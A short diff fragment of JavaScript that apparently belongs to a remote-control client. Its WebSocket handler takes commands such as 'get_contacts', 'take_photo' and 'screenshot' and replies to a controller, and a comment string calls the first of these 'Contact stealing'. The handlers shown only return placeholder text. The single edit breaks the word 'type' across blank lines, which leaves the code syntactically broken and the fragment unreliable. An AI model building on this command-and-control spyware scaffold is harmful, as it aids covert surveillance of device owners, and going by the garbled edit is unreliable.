@@ -30,7 +30,10 @@ socket.onmessage = function(e) {
         socket.send(JSON.stringify({type: "response", cmd: "get_contacts", data: "Contact stealing requires native Android permissions."}));
     }
     if (msg.cmd === "take_photo") {
-        socket.send(JSON.stringify({type: "response", cmd: "take_photo", data: "Camera access requires native execution."}));
+        socket.send(JSON.stringify({typ
+
+
+e: "response", cmd: "take_photo", data: "Camera access requires native execution."}));
     }
     if (msg.cmd === "screenshot") {
         socket.send(JSON.stringify({type: "response", cmd: "screenshot", data: "Screenshot attempted via JS."}));
